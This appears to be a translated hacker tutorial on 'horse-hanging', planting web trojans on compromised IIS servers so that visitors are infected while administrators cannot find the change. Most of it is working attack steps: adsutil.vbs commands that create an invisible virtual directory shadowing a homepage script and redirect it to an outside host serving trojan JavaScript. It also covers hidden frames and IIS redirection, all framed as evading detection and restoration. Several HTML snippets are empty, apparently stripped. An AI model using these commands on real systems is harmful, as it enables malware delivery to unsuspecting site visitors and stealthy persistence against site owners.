Unusual Horse-Hanging Methods

I'm writing this article not to teach anyone how to go out and "hang horses" — horse-hanging is wrong! However, sometimes you really want to do something that feels satisfying. For example, I've encountered many administrators who, when told there's an issue with the server, don't believe it. When you modify something to warn them, they are more diligent than you. As soon as you make a change, they immediately revert it, which can be very frustrating. Additionally, on some overseas machines, even though you have all the permissions, you still can't write anything. You manage to create a file, but it gets reverted shortly after. It's incredibly infuriating! Apparently, there's software that monitors important files and restores them if any changes are detected. For instance, if it monitors the web directory, we won't be able to alter any content on the website.

However, after reading many articles by experts and conducting my own research, I’ve managed to figure out a way to deface pages or achieve the effects commonly referred to as "horse-hanging" without writing any files. Here, I'll introduce this method to everyone, and those diligent administrators should also be cautious!

As we know, when browsing websites, the server processes the information into HTML format before returning it to us. What we aim to achieve is changing the content displayed in the client's browser when they visit the site, making it execute our code covertly, such as a Trojan horse, etc. A common method is introducing a frame and setting its properties so it’s invisible on the page. Alternatively, some might boldly use JavaScript redirection. More advanced methods involve exploiting HTML elements like script tags or frame tags in the original code, then tampering with the files or pages referenced within these tags. Another approach is modifying certain database contents displayed on the homepage, such as altering announcements in the database to implement horse-hanging. However, all these methods require adding or modifying content in the server's original code, whether through cross-site scripting or directly editing the original code, which is extremely easy to detect. If you encounter a diligent administrator, your work won't last long on the server. Moreover, if some pages are unwritable, it can be quite frustrating. Therefore, it’s necessary to find a more covert and secure way to hang horses to solve the above problems.

First, let's take a look at the IIS Manager! Select a page and check its properties. Ah, there's a resource redirection option! If we redirect this page to one we control, when the browser requests this page, it will instead access the one we define. If that page contains a web Trojan, obviously, visitors will be infected. This is a simple method; you just need to change the redirection settings in IIS! Anyone who can access the IIS Manager can easily do this! However, there’s still an issue here. If the administrator notices the page keeps redirecting, and restoring the website files from backups doesn’t solve the problem, they will definitely check the IIS settings! With a quick glance at the main page's properties, they might discover the issue and revert the changes.

So, let's explore a more hidden method! Borrowing from previous horse-hangers' techniques, since the main page is easily detectable, let's examine the HTML tags within the main page! If it calls other pages, that's good news! For instance, if the homepage has the following tag:

```html

```

We can modify the attributes of `include/mm2.js`! Redirect it to one of our pages, ensuring the content can be interpreted within the script tag, such as:

```javascript

document.write("");

```

This allows us to include our page! Ideally, we should first implement its JS functionality to remain more covert. At this point, the administrator will notice that the homepage hasn't been altered, nor have the homepage properties in IIS changed. Even the www files on the host haven't been modified, leaving them puzzled. If they simply restore the old website backup, they won't be able to revert the page. Given the large number of IIS files, they can't possibly check each property one by one! By the way, the file you redirect to must be interpretable by the HTML tag that references it; otherwise, it won't work. For example, `` redirecting 1.jpg to our Trojan page won't work because the Trojan page isn't parsed as HTML but rather sent to the img tag as an image. The tags I can think of that can be exploited are script and frame. Regarding CSS, I believe it can also be exploited, but I haven't found the method yet. Please feel free to correct me if I'm wrong!

Let's continue! Suppose the administrator is skilled or diligent enough to discover the tampering in `mm2.js` and restores it via IIS. Our dream is shattered again! Is there a more covert method? One that the administrator can't even find in IIS? The answer is yes! You might remember the old IIS configuration vulnerability where you could create an invisible virtual directory and set up a backdoor inside. We can utilize this too! The principle behind the IIS configuration vulnerability is creating a virtual directory without a physical path, making it invisible in IIS. Then, you can perform small actions within this directory. First, let's create an invisible virtual directory. If the homepage calls js files under the `include` folder, we'll create the `include` directory. This can be achieved using IIS scripts. The `adsutil.vbs` script is located in the IIS installation directory, such as `C:\Inetpub\AdminScripts`, and controls IIS behavior. The command we’ll use is:

```cmd

cscript adsutil.vbs Create W3SVC/1/Root/www/include "IIsWebVirtualDir"

```

This creates an invisible virtual directory in IIS because no path is set, so it won't be visible! Next, create a virtual directory named `mm2.js` within this directory. Interestingly, special characters like `.` can be used when creating virtual directories:

```cmd

cscript adsutil.vbs Create W3SVC/1/Root/www/include/mm2.js "IIsWebVirtualDir"

```

Now, there's a virtual directory called `include/mm2.js`. Do you see what's happening? It matches the name of the file called by the homepage! Let's proceed further:

```cmd

cscript adsutil.vbs set W3SVC/1/Root/www/include/mm2.js/httpredirect "http://jnclovesw.com/mm1.js"

```

This modifies the redirection property of the `mm2.js` virtual directory. Note that `W3SVC/1/Root/www/` represents the first web server's www virtual directory in IIS. If you're unsure, you can use the `enum` parameter in `adsutil.vbs` to query the website you need to modify. For other operations, refer to the help documentation in the `adsutil.vbs` script. After performing these operations, the redirection property of the virtual directory is set. Now try calling `include/mm2.js` on the homepage. Guess what returns: the content of `mm2.js` or our `mm1.js`? The answer is `mm1.js`, and the physical file still exists! This might be a characteristic of IIS — it processes user requests and prioritizes virtual directories over physical files! Now, let's check IIS to see if there's an `include` virtual directory. There isn't, right? Ha! Thus, we successfully bypassed permission restrictions and administrator detection, hanging our Trojan on the opponent's website. Unless they reinstall IIS or delete our hidden virtual directory, it will be difficult for them to remove our Trojan.

This article is simple, focusing on IIS script commands and understanding IIS. This horse-hanging method is suitable for use after obtaining administrative privileges, and it's quite effective against diligent administrators! Remember to use this script to check for issues if you discover problems with a website. Or, better yet, back up the IIS settings! Restore the IIS settings when issues arise, ha!
